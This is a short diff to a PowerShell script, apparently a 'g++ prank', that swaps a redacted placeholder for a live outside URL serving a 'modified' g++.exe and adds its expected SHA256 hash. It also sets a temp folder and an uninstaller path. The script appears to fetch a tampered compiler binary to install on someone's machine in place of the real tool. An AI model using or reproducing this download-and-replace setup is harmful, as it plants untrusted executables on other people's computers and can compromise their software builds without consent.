@@ -8,8 +8,8 @@
 #>
 
 # Configuration
-$ModifiedGppUrl = "https://redacted.com/g++.exe"
-$ExpectedSHA256 = "" # Get this from: (Get-FileHash .\g++.exe -Algorithm SHA256).Hash
+$ModifiedGppUrl = "https://41.jiers.me/g++.exe"
+$ExpectedSHA256 = "443f1a5a4a425248a8d16b2d61af5a7a80d68a13b2008cbafd314b4e9cbfd82b" # Get this from: (Get-FileHash .\g++.exe -Algorithm SHA256).Hash
 $TempDir = "$env:TEMP\gpp_prank"
 $UninstallerPath = "$env:USERPROFILE\uninstallgpp.bat"
 
